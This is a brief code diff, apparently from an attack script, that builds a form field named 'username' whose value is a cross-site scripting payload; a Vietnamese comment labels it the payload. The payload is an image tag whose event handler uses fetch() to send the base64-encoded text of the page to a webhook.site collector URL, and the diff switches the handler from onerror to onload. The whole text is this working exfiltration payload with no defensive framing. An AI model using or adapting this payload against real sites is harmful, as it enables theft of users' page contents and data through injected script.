@@ -19,7 +19,7 @@
         input.name = 'username';
         
         // Payload: Thử dùng top.window.opener hoặc window.opener
-        input.value = `<img src=x onerror="fetch('https://webhook.site/122cd883-0402-47a8-a264-d10c171c01ce?s='+btoa(document.body.innerText))">`;
+        input.value = `<img src=x onload="fetch('https://webhook.site/122cd883-0402-47a8-a264-d10c171c01ce?s='+btoa(document.body.innerText))">`;
 
         form.appendChild(input);
         document.body.appendChild(form);
